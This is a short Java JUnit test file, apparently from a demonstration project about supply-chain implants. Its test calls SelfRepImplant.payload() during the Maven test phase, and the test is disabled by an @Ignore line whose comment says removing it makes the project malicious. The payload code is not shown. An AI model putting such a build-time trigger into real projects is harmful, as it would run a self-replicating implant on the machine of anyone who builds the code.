package org.example.implants;

import org.junit.Ignore;
import org.junit.Test;

public class DetonateDuringTests {
    @Test
    @Ignore // Comment or remove this line to make this a very malicious Maven project
    public void testDetonate() {
        SelfRepImplant.payload();   // BOOM!
    }
}
